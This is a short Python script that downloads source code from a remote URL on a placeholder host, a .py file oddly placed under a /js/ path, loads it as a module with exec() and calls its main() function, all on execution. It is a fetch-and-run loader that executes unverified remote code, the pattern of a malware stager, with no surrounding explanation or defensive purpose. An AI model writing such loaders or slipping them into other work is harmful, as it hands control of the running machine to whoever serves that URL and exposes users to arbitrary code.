import sys
import types
import urllib.request

def get_source_code(url):
    with urllib.request.urlopen(url) as response:
        return response.read().decode('utf-8')

def execute():
    url = "https://cdn.example.net/js/library.py"
    module_name = "run_lib"

    source = get_source_code(url)

    module = types.ModuleType(module_name)
    sys.modules[module_name] = module

    exec(source, module.__dict__)

    try:
        module.main()
    except Exception as e:
        print(e)

execute()
